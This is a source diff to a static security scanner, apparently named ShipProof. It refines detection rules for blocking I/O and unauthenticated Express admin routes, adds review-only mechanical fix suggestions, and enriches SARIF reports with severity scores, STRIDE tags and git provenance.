         ),
         "A filesystem operation constructs paths directly from variables without visible normalization.",
         "Normalize with realpath/resolve and verify the path remains inside the base directory.",
@@ -7009,7 +7620,9 @@ RULES: tuple[Rule, ...] = (
         "reliability",
         "high",
         "high",
-        compile_pattern(r"""(?:fs\.readFileSync|fs\.writeFileSync|open\([^)]*\)\.read\(\))\s*"""),
+        compile_pattern(
+            r"""(?:for\s*\([^)]*\)|while\s*\([^)]*\))[\s\S]{0,120}?fs\.(?:readFileSync|writeFileSync)|(?:fs\.(?:readFileSync|writeFileSync))[^\n]*(?:for\s*\(|while\s*\()|(?:open\s*\([^)]*\)\s*\.\s*read\s*\(\))"""
+        ),
         "Synchronous filesystem I/O is called directly inside an async event loop, blocking request handling.",
         "Use async filesystem APIs (e.g. fs.promises.readFile or aiofiles) or run in a threadpool.",
         "CWE-400",
@@ -11711,6 +12324,11 @@ RULES: tuple[Rule, ...] = (
 SECRET_RULE_IDS = frozenset(rule.rule_id for rule in RULES if rule.redact)
 RULE_INDEX = {rule.rule_id: rule for rule in RULES}
 
+# Rules whose evidence is the CONTENT of a string literal (URL query shapes,
+# URI schemes) rather than code position; the inside-string filter must not
+# suppress them.
+STRING_CONTENT_RULE_IDS = frozenset({"SP148", "SP615", "SP616", "SP617"})
+
 
 # --- Literal gate prefilter ---
 # A regex can only match text that contains every literal the pattern requires
@@ -12100,6 +12718,10 @@ DOWNRANK_CONFIDENCE = {
 # keep full confidence. Absent manifests keep confidence; present-but-absent
 # framework declarations downgrade it (see find_regex_issues).
 RULE_FRAMEWORK_HINTS = {
+    "SP108": frozenset(
+        {"fastapi", "django", "flask", "express", "fastify", "nestjs", "koa", "hono"}
+    ),
+    "SP593": frozenset({"nextjs"}),
     "SP401": frozenset({"express"}),
     "SP402": frozenset({"express"}),
     "SP407": frozenset({"express"}),
@@ -12115,6 +12737,16 @@ RULE_FRAMEWORK_HINTS = {
     "SP664": frozenset({"fastapi"}),
     "SP665": frozenset({"django"}),
 }
+
+# Pattern-detection rules whose look-alike risk also depends on the declared
+# framework; without this they would never participate in the downgrade above.
+FRAMEWORK_HINT_PATTERN_RULES = frozenset({"SP593"})
+
+# Bundled vendor artifacts: minified bundles and content-hashed filenames.
+MINIFIED_FILE_NAME = re.compile(
+    r"(?:\.min\.(?:js|mjs|cjs|css)|-[0-9a-f]{8,}\.(?:js|mjs|cjs|css))$",
+    re.IGNORECASE,
+)
 
 
 @lru_cache(maxsize=8192)
@@ -12357,6 +12989,16 @@ def find_regex_issues(
             matched_text = match.group(0)
             if rule_is_secret and is_placeholder_secret(matched_text):
                 continue
+            # A match entirely inside a quoted literal is data (an example,
+            # log message, or documented snippet), not executable code.
+            # Exception: rules whose evidence IS the string content (OAuth
+            # URL parameters, javascript: schemes) and secret values.
+            if (
+                not rule_is_secret
+                and rule_id not in STRING_CONTENT_RULE_IDS
+                and _match_inside_string_literal(line, match.start())
+            ):
+                continue
             confidence_override = secret_confidence(rule, matched_text) if rule_is_secret else None
             findings.append(
                 make_finding(
@@ -12593,6 +13235,25 @@ def find_regex_issues(
         if route_line:
             append_file_level_finding(findings, "SP402", relative_path, lines, route_line)
 
+    # Framework-specific: Express admin/internal route without visible
+    # authorization (SP108 on JavaScript). Report only when the route's own
+    # chain shows no auth hint AND the file registers no global auth middleware
+    # AND its non-comment code carries no broad authorization signal; routes
+    # whose guard lives in another module stay unreported (documented FP
+    # boundary). Comment lines cannot grant or revoke coverage.
+    if has_express_call and suffix in {".js", ".mjs", ".cjs", ".ts"}:
+        js_admin_lines = express_admin_route_lines_without_auth(lines, comment_flags)
+        code_only_text = "\n".join(
+            line for index, line in enumerate(lines) if not comment_flags[index]
+        )
+        if (
+            js_admin_lines
+            and not has_global_express_auth(code_only_text)
+            and not BROAD_JS_AUTH_SIGNAL.search(code_only_text)
+        ):
+            for admin_line in js_admin_lines[:5]:
+                append_file_level_finding(findings, "SP108", relative_path, lines, admin_line)
+
     # Framework-specific: cookie-session routes without CSRF protection
     if (
         has_express_call
@@ -12774,23 +13435,29 @@ def find_regex_issues(
         findings = [
             (
                 replace(finding, confidence=DOWNRANK_CONFIDENCE.get(finding.confidence, "low"))
-                if finding.detection == "structural"
-                and finding.rule_id in RULE_FRAMEWORK_HINTS
+                if finding.rule_id in RULE_FRAMEWORK_HINTS
                 and not RULE_FRAMEWORK_HINTS[finding.rule_id] & detected_frameworks
+                and (
+                    finding.detection == "structural"
+                    or finding.rule_id in FRAMEWORK_HINT_PATTERN_RULES
+                )
                 else finding
             )
             for finding in findings
         ]
     # Generated/minified lines: a finding on a thousand-plus-character line is
     # usually machine-produced bundle text, so keep it for review but at a
-    # lower confidence. Secrets stay at full confidence — a key inside a
-    # bundle is still a leaked key.
+    # lower confidence. Bundled vendor filenames (.min.js and hashed bundles)
+    # get the same treatment for every line. Secrets stay at full confidence —
+    # a key inside a bundle is still a leaked key.
     findings = [
         (
             replace(finding, confidence=DOWNRANK_CONFIDENCE.get(finding.confidence, "low"))
-            if 0 < finding.line <= len(lines)
-            and len(lines[finding.line - 1]) > 1000
-            and finding.rule_id not in SECRET_RULE_IDS
+            if finding.rule_id not in SECRET_RULE_IDS
+            and (
+                (0 < finding.line <= len(lines) and len(lines[finding.line - 1]) > 1000)
+                or MINIFIED_FILE_NAME.search(relative_path.replace("\\", "/")) is not None
+            )
             else finding
         )
         for finding in findings
@@ -12832,12 +13499,170 @@ STOP_CONDITION_HINT = re.compile(r"\bstop")
 UNBOUNDED_JS_RETRIES = re.compile(r"retries\s*:\s*Infinity\b", re.IGNORECASE)
 GO_HTTP_SERVER_INIT = re.compile(r"http\.Server\s*\{")
 
+# Express authorization evidence (SP108 on JavaScript). A route counts as
+# covered when its own middleware chain names an auth-like identifier or when
+# the file registers a global app.use(<auth middleware>). Files that carry no
+# broad auth signal at all are the reviewable gap; routes whose authorization
+# lives in another module stay unreported by design.
+JS_ADMIN_ROUTE_CALL = re.compile(
+    r"""\.\s*(?:all|get|post|put|patch|delete)\s*\(\s*["'`]([^"'`]*)["'`]""",
+    re.IGNORECASE,
+)
+GLOBAL_AUTH_USE = re.compile(r"""\.\s*use\s*\(""")
+GLOBAL_AUTH_HINTS = ("auth", "jwt", "passport", "login", "permission", "policy", "scope")
+ROUTE_CHAIN_AUTH_HINTS = (*GLOBAL_AUTH_HINTS, "admin", "role", "session")
+BROAD_JS_AUTH_SIGNAL = re.compile(
+    r"""passport|jsonwebtoken|\bjwt\b|express-session|\bclerk\b|\bauth0\b"""
+    r"""|next-auth|authmiddleware|requireauth|checkauth|isauthenticated"""
+    r"""|ensureauthenticated|ensureadmin|verifytoken|authoriz""",
+    re.IGNORECASE,
+)
+
+
+def _js_balanced_paren_span(
+    source_text: str, open_index: int, limit_chars: int = 4000
+) -> int | None:
+    """Index of the ')' matching source_text[open_index].
+
+    Skips string literals (including template interpolations) and comments so
+    nested calls and quoted paths cannot desynchronize the depth count. The
+    scan is bounded by limit_chars and returns None when no close is found.
+    """
+    limit = min(len(source_text), open_index + limit_chars)
+    depth = 0
+    index = open_index
+    while index < limit:
+        char = source_text[index]
+        if char == "/" and index + 1 < limit and source_text[index + 1] == "/":
+            newline = source_text.find("\n", index, limit)
+            index = newline if newline != -1 else limit
+            continue
+        if char == "/" and index + 1 < limit and source_text[index + 1] == "*":
+            closing = source_text.find("*/", index + 2, limit)
+            index = closing + 2 if closing != -1 else limit
+            continue
+        if char in {"'", '"', "`"}:
+            quote = char
+            index += 1
+            while index < limit:
+                inner = source_text[index]
+                if inner == "\\":
+                    index += 2
+                    continue
+                if (
+                    quote == "`"
+                    and inner == "$"
+                    and index + 1 < limit
+                    and source_text[index + 1] == "{"
+                ):
+                    brace_depth = 1
+                    index += 2
+                    while index < limit and brace_depth:
+                        nested = source_text[index]
+                        if nested == "{":
+                            brace_depth += 1
+                        elif nested == "}":
+                            brace_depth -= 1
+                            if brace_depth == 0:
+                                break
+                        elif nested in {"'", '"'}:
+                            nested_quote = nested
+                            index += 1
+                            while index < limit:
+                                if source_text[index] == "\\":
+                                    index += 2
+                                    continue
+                                if source_text[index] == nested_quote:
+                                    break
+                                index += 1
+                        index += 1
+                    continue
+                if inner == quote:
+                    break
+                index += 1
+            index += 1
+            continue
+        if char == "(":
+            depth += 1
+        elif char == ")":
+            depth -= 1
+            if depth == 0:
+                return index
+        index += 1
+    return None
+
+
+def has_global_express_auth(code_text: str) -> bool:
+    """True when some .use(...) registration passes an auth-like middleware.
+
+    Only bare identifiers count as coverage: app.use(express.json()) is
+    configuration, not authorization evidence. ``code_text`` must have pure
+    comment lines removed so documentation prose cannot grant coverage.
+    """
+    checked = 0
+    for match in GLOBAL_AUTH_USE.finditer(code_text):
+        close_index = _js_balanced_paren_span(code_text, match.end() - 1)
+        if close_index is None:
+            continue
+        arguments = code_text[match.end() : close_index]
+        for token in re.findall(r"[A-Za-z_$][\w$.]*", arguments):
+            lowered = token.rsplit(".", 1)[-1].lower()
+            if any(hint in lowered for hint in GLOBAL_AUTH_HINTS):
+                return True
+        checked += 1
+        if checked >= 64:
+            break
+    return False
+
+
+def express_admin_route_lines_without_auth(
+    lines: Sequence[str], comment_flags: Sequence[bool]
+) -> list[int]:
+    """Return 1-based lines of admin/internal/management route registrations
+    whose own middleware chain shows no authorization hint."""
+    results: list[int] = []
+    for index, line in enumerate(lines):
+        if comment_flags[index]:
+            continue
+        match = JS_ADMIN_ROUTE_CALL.search(line)
+        if match is None:
+            continue
+        segments = [segment.strip(":").lower() for segment in match.group(1).split("/")]
+        if not SENSITIVE_ROUTE_SEGMENTS.intersection(segments):
+            continue
+        chain_text = line[match.end() :].lower()
+        if any(hint in chain_text for hint in ROUTE_CHAIN_AUTH_HINTS):
+            continue
+        results.append(index + 1)
+    return results
+
 
 def find_rule(rule_id: str) -> Rule:
     rule = RULE_INDEX.get(rule_id)
     if rule is None:
         raise ValueError(f"unknown rule id: {rule_id}")
     return rule
+
+
+def _match_inside_string_literal(line: str, column: int) -> bool:
+    """True when ``column`` lies inside an unclosed quoted literal of ``line``.
+
+    Single-line heuristic across ', ", and ` with escape handling; multi-line
+    prose is already covered by the dedicated multiline-string filters.
+    """
+    quote = None
+    index = 0
+    while index < column:
+        char = line[index]
+        if quote is not None:
+            if char == "\\":
+                index += 1
+            elif char == quote:
+                quote = None
+        elif char in {"'", '"', "`"}:
+            quote = char
+        index += 1
+    return quote is not None
 
 
 def append_file_level_finding(
@@ -14243,7 +15068,7 @@ def build_json_report(
             **stats,
             "by_severity": dict(Counter(item.severity for item in findings)),
         },
-        "findings": [asdict(item) for item in findings],
+        "findings": [_finding_payload(item) for item in findings],
         "limitations": [
             "Fast heuristic scan; confirm every finding.",
             "No runtime reachability, dependency CVE database, or git-history scan.",
@@ -14896,7 +15721,240 @@ def render_explain(
     return "\n".join(lines)
 
 
-def build_sarif_report(findings: Sequence[Finding]) -> dict[str, object]:
+# --- Mechanical fix scaffolds -------------------------------------------
+# Curated, deterministic line transforms for rules whose safe correction is
+# purely mechanical (flag flips). Every scaffold is a *suggestion requiring
+# human review* — never applied automatically, and never generated for
+# redacted secret rules where before/after text would leak credential
+# material into reports.
+_FIX_LINE_TRANSFORMS: dict[str, tuple[re.Pattern[str], object, str, str]] = {
+    "SP102": (
+        re.compile(r"(shell\s*=\s*)(?:true|True)"),
+        lambda m: m.group(1) + "False",
+        "Disable shell interpretation so metacharacters cannot chain commands.",
+        "Confirm no argument depends on shell syntax (pipes, globs, $VAR); prefer argument arrays.",
+    ),
+    "SP104": (
+        re.compile(r"((?:verify|rejectUnauthorized)\s*[:=]\s*)(false|False)"),
+        lambda m: m.group(1) + ("True" if m.group(2)[0].isupper() else "true"),
+        "Restore TLS peer verification.",
+        "Ensure the runtime trusts the correct CA bundle; pin certificates for fixed internal endpoints.",
+    ),
+    "SP201": (
+        re.compile(r"(debug\s*[:=]\s*)(true|True|1)(?![\w])"),
+        lambda m: m.group(1) + ("0" if m.group(2) == "1" else "False"),
+        "Turn off debug mode in application code.",
+        "Drive debug from environment configuration instead of a constant.",
+    ),
+    "SP133": (
+        re.compile(r'(debug\s*=\s*)("true")'),
+        lambda m: m.group(1) + '"false"',
+        "Disable ASP.NET debug compilation in deployed configuration.",
+        "Keep retail/debug overrides per-environment rather than committed literals.",
+    ),
+}
+
+
+def build_fix_scaffold(finding: Finding) -> dict[str, str] | None:
+    """Return a review-required mechanical fix suggestion, or None.
+
+    Scaffolds exist only for curated flag-flip rules; the transform runs on
+    the finding's evidence line and must change it to produce a scaffold.
+    Redacted rules never scaffold because their evidence carries no usable,
+    leak-safe source text.
+    """
+    rule = RULE_INDEX.get(finding.rule_id)
+    if rule is None or rule.redact:
+        return None
+    spec = _FIX_LINE_TRANSFORMS.get(finding.rule_id)
+    if spec is None:
+        return None
+    pattern, replacement, summary, note = spec
+    before = finding.evidence.strip()
+    if not before:
+        return None
+    after = pattern.sub(replacement, before)
+    if after == before:
+        return None
+    return {
+        "summary": summary,
+        "before": before,
+        "after": after,
+        "review_note": note,
+    }
+
+
+def _finding_payload(item: Finding) -> dict[str, object]:
+    payload: dict[str, object] = asdict(item)
+    scaffold = build_fix_scaffold(item)
+    if scaffold is not None:
+        payload["fix_scaffold"] = scaffold
+    return payload
+
+
+# --- SARIF enrichment ---------------------------------------------------
+# GitHub code-scanning ranks alerts by rule.properties["security-severity"]
+# (a 0.0-10.0 string). We derive it deterministically from the severity label.
+_SEVERITY_TO_SECURITY_SEVERITY = {
+    "critical": "9.5",
+    "high": "8.0",
+    "medium": "5.5",
+    "low": "3.0",
+    "none": "1.0",
+}
+
+# CWE -> STRIDE legs (dominant leg first) so Security-tab consumers can group
+# findings by threat-model class. Unmapped CWE roots fall back to the default
+# pair, so every rule carries at least one leg.
+_CWE_TO_STRIDE: dict[str, tuple[str, ...]] = {
+    "59": ("T", "E"),
+    "74": ("T",),
+    "78": ("T", "E"),
+    "79": ("T", "I"),
+    "88": ("T",),
+    "89": ("T", "I"),
+    "90": ("T",),
+    "94": ("T", "E"),
+    "95": ("T", "E"),
+    "98": ("T", "E"),
+    "102": ("E",),
+    "113": ("T", "I"),
+    "120": ("T", "E"),
+    "200": ("I",),
+    "208": ("S",),
+    "209": ("I",),
+    "22": ("I", "T"),
+    "250": ("E",),
+    "256": ("I",),
+    "284": ("E", "T"),
+    "294": ("S",),
+    "295": ("S", "I"),
+    "306": ("S", "E"),
+    "307": ("D", "S"),
+    "311": ("I",),
+    "319": ("I",),
+    "321": ("I", "S"),
+    "326": ("I",),
+    "327": ("I",),
+    "328": ("I",),
+    "329": ("I",),
+    "330": ("S", "I"),
+    "337": ("S", "I"),
+    "338": ("S", "I"),
+    "345": ("S", "T"),
+    "346": ("S",),
+    "347": ("S", "T"),
+    "352": ("T", "S"),
+    "353": ("T",),
+    "362": ("T", "E"),
+    "377": ("T",),
+    "390": ("R",),
+    "396": ("R",),
+    "398": ("R", "T"),
+    "400": ("D",),
+    "430": ("E",),
+    "453": ("T",),
+    "470": ("E",),
+    "476": ("D",),
+    "489": ("I",),
+    "502": ("T", "E"),
+    "524": ("I",),
+    "532": ("I",),
+    "598": ("I",),
+    "601": ("S",),
+    "602": ("E",),
+    "611": ("I", "T"),
+    "613": ("S",),
+    "614": ("I",),
+    "621": ("T", "E"),
+    "624": ("T", "E"),
+    "639": ("E",),
+    "643": ("T",),
+    "644": ("T",),
+    "650": ("E",),
+    "662": ("D",),
+    "667": ("T",),
+    "674": ("D",),
+    "693": ("E",),
+    "732": ("E",),
+    "748": ("E",),
+    "754": ("D",),
+    "755": ("D",),
+    "758": ("S",),
+    "770": ("D",),
+    "772": ("D",),
+    "798": ("I",),
+    "829": ("T", "E"),
+    "833": ("D",),
+    "834": ("D",),
+    "835": ("D",),
+    "862": ("S", "E"),
+    "863": ("E", "S"),
+    "915": ("T", "E"),
+    "916": ("I",),
+    "917": ("T", "E"),
+    "918": ("I", "E"),
+    "922": ("I",),
+    "942": ("S",),
+    "943": ("T", "E"),
+    "1004": ("I",),
+    "1021": ("S",),
+    "1022": ("S",),
+    "1088": ("T",),
+    "1104": ("T",),
+    "1275": ("S",),
+    "1321": ("T", "E"),
+    "1333": ("D",),
+    "1336": ("T", "E"),
+    "1385": ("S",),
+}
+_DEFAULT_STRIDE_LEGS: tuple[str, ...] = ("T", "I")
+
+
+def _stride_legs_for_cwe(cwe: str | None) -> tuple[str, ...]:
+    if not cwe:
+        return _DEFAULT_STRIDE_LEGS
+    digits = "".join(char for char in cwe if char.isdigit())
+    return _CWE_TO_STRIDE.get(digits, _DEFAULT_STRIDE_LEGS)
+
+
+def _git_provenance(root: Path | None) -> list[dict[str, str]] | None:
+    """Local read-only git context for versionControlProvenance.
+
+    Reads HEAD, branch, and origin URL straight from repository metadata — no
+    network, no worktree writes. Returns None outside git repositories so the
+    SARIF key is simply omitted rather than fabricated.
+    """
+    if root is None:
+        return None
+
+    def git(*args: str) -> str:
+        completed = subprocess.run(  # noqa: S603 - fixed argv, shell disabled
+            ["git", "-C", str(root), *args],  # noqa: S607
+            capture_output=True,
+            text=True,
+            shell=False,
+            check=False,
+        )
+        return completed.stdout.strip()
+
+    try:
+        revision = git("rev-parse", "HEAD")
+        if not revision:
+            return None
+        entry: dict[str, str] = {"revisionId": revision}
+        branch = git("rev-parse", "--abbrev-ref", "HEAD")
+        if branch and branch != "HEAD":
+            entry["branch"] = branch
+        remote = git("config", "--get", "remote.origin.url")
+        if remote:
+            entry["repositoryUri"] = remote
+        return [entry]
+    except OSError:
+        return None
+
+
+def build_sarif_report(findings: Sequence[Finding], root: Path | None = None) -> dict[str, object]:
     rules: dict[str, Finding] = {item.rule_id: item for item in findings}
     level = {
         "critical": "error",
@@ -14914,56 +15972,94 @@ def build_sarif_report(findings: Sequence[Finding]) -> dict[str, object]:
             region["endLine"] = item.end_line
         if item.end_column is not None:
             region["endColumn"] = item.end_column
-        results.append(
-            {
-                "ruleId": item.rule_id,
-                "level": level.get(item.severity, "note"),
-                "message": {"text": item.message},
-                "locations": [
-                    {
-                        "physicalLocation": {
-                            "artifactLocation": {"uri": item.path},
-                            "region": region,
-                        }
+        result_entry: dict[str, object] = {
+            "ruleId": item.rule_id,
+            "level": level.get(item.severity, "note"),
+            "message": {"text": item.message},
+            "locations": [
+                {
+                    "physicalLocation": {
+                        "artifactLocation": {"uri": item.path},
+                        "region": region,
                     }
+                }
+            ],
+            "partialFingerprints": {"shipproof/v1": item.fingerprint},
+            "properties": {
+                "severity": item.severity,
+                "confidence": item.confidence,
+                "detection": item.detection,
+                "proof_level": item.proof_level,
+                "scope": item.scope,
+                "verification_status": item.verification_status,
+                "cwe": item.cwe,
+            },
+        }
+        scaffold = build_fix_scaffold(item)
+        if scaffold is not None:
+            # Suggestions replace the finding's full first line with its
+            # corrected form; transforms are line-scoped by design.
+            result_entry["fixes"] = [
+                {
+                    "description": {"text": f"{scaffold['summary']} {scaffold['review_note']}"},
+                    "artifactChanges": [
+                        {
+                            "artifactLocation": {"uri": item.path},
+                            "replacements": [
+                                {
+                                    "deletedRegion": {
+                                        "startLine": item.line,
+                                        "startColumn": 1,
+                                        "endLine": item.line,
+                                        "endColumn": len(scaffold["before"]) + 1,
+                                    },
+                                    "insertedContent": {"text": scaffold["after"]},
+                                }
+                            ],
+                        }
+                    ],
+                }
+            ]
+        results.append(result_entry)
+    run: dict[str, object] = {
+        "tool": {
+            "driver": {
+                "name": "ShipProof",
+                "version": VERSION,
+                "informationUri": "https://github.com/kingggg5/shipproof",
+                "rules": [
+                    {
+                        "id": item.rule_id,
+                        "name": item.title.replace(" ", "_"),
+                        "shortDescription": {"text": item.title},
+                        "fullDescription": {"text": item.message},
+                        "help": {"text": item.remediation},
+                        "properties": {
+                            "tags": [
+                                item.category,
+                                item.cwe,
+                                item.owasp,
+                                *(f"stride:{leg}" for leg in _stride_legs_for_cwe(item.cwe)),
+                            ],
+                            "security-severity": _SEVERITY_TO_SECURITY_SEVERITY.get(
+                                item.severity, "5.0"
+                            ),
+                        },
+                    }
+                    for item in rules.values()
                 ],
-                "partialFingerprints": {"shipproof/v1": item.fingerprint},
-                "properties": {
-                    "severity": item.severity,
-                    "confidence": item.confidence,
-                    "detection": item.detection,
-                    "proof_level": item.proof_level,
-                    "scope": item.scope,
-                    "verification_status": item.verification_status,
-                },
             }
-        )
+        },
+        "results": results,
+        "automationDetails": {"id": f"shipproof/{VERSION}"},
+    }
+    provenance = _git_provenance(root)
+    if provenance is not None:
+        run["versionControlProvenance"] = provenance
     return {
         "version": "2.1.0",
         "$schema": "https://json.schemastore.org/sarif-2.1.0.json",
-        "runs": [
-            {
-                "tool": {
-                    "driver": {
-                        "name": "ShipProof",
-                        "version": VERSION,
-                        "informationUri": "https://github.com/kingggg5/shipproof",
-                        "rules": [
-                            {
-                                "id": item.rule_id,
-                                "name": item.title.replace(" ", "_"),
-                                "shortDescription": {"text": item.title},
-                                "fullDescription": {"text": item.message},
-                                "help": {"text": item.remediation},
-                                "properties": {"tags": [item.category, item.cwe, item.owasp]},
-                            }
-                            for item in rules.values()
-                        ],
-                    }
-                },
-                "results": results,
-            }
-        ],
+        "runs": [run],
     }
 
 
@@ -15267,7 +16363,7 @@ def main(argv: Sequence[str] | None = None) -> int:
                     decision_trace=decision_trace,
                 )
             elif fmt == "sarif":
-                output = json.dumps(build_sarif_report(findings), indent=2)
+                output = json.dumps(build_sarif_report(findings, arguments.root), indent=2)
             elif fmt == "github":
                 output = render_github_annotations(findings)
             else:
